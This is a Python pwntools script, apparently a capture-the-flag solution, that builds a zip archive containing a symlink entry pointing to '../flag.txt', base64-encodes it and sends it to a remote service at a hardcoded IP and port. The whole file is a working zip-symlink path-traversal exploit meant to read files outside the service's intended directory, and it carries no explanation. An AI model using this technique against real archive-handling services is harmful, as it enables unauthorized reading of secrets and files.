import stat
import zipfile
from pwn import *
import base64
import os

def create_symzip(output_zip_filename, link_source, link_target):
    # Create a ZipInfo object for the symlink
    zipInfo = zipfile.ZipInfo(link_source)
    # Set the system attribute to indicate Unix
    zipInfo.create_system = 3
    # Define the Unix symlink mode
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    # Set the external attributes to store the symlink mode
    zipInfo.external_attr = unix_st_mode << 16
    # Open the output zip file
    zipOut = zipfile.ZipFile(output_zip_filename, 'w', compression=zipfile.ZIP_DEFLATED)
    # Write the symlink to the zip file
    zipOut.writestr(zipInfo, link_target)
    # Close the zip file
    zipOut.close()



# pp = process("./zop")
pp = remote("172.210.180.5", 1349)
pp.recvuntil(b">> ")

log.info("crafting the zop")
create_symzip('zop.zip', 'alternate.txt', '../flag.txt')

log.info("sending the zop")
zop = open("zop.zip", "rb")
zop_content = base64.b64encode(zop.read())
pp.sendline(zop_content)
pp.interactive()

